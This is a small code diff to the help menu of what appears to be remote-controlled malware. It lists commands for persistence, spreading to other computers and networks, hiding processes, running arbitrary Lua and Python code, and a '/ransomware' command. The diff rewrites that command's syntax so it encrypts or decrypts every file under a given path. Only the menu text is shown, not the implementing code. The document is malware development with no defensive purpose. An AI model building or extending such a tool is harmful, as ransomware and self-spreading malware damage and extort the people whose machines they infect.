@@ -33,9 +33,6 @@ Make the malware persist in the system
 /pivot
 Try to spread the malware to other computers, devices and networks
 
-/ransomware path host <key>
-Encrypt all the files from the path (recursively). Ask the encryption key to remote host or provide it from telegram
-
 /stealth
 Make the program hidde it's processes
 
@@ -72,6 +69,13 @@ Run lua code
 
 /python code
 Run python code
+
+/ransomware mode key path speed
+Encrypt/Decrypt all the files under path
+mode  -> e,d
+key   -> your_key
+path  -> /home/folderToEncrypt
+speed -> 1,2,3,4,5,6,7,8,9,10,11 (faster to slowest)
 
 `;
     }
